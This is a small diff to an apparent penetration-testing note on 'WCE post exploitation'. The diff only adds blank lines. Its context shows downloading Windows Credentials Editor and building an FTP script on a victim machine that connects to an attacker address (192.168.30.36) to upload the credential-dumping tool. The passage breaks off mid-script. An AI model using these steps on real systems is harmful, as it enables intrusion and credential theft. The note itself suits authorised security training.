@@ -7,6 +7,7 @@ title: WCE post exploitation
 
 
 
+
 Download wce
 
     cd /opt/
@@ -14,6 +15,7 @@ Download wce
     unzip wce_v1_41beta_universal.zip -d wce
 
 **Victim**:  With ftp server running on attacking box.  Upload wce.exe to victim
+
     echo open 192.168.30.36> ftp.txt
     echo your_username>> ftp.txt
     echo your_password>> ftp.txt
